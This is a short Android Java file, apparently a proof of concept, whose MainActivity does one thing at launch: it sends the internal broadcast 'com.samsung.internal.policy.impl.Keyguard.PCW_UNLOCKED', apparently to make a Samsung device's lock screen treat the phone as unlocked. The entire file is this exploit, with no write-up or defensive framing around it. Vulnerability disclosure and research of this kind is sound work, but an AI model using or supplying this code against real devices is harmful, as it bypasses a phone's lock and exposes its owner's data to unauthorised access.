package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        sendBroadcast(new Intent("com.samsung.internal.policy.impl.Keyguard.PCW_UNLOCKED"));
    }
}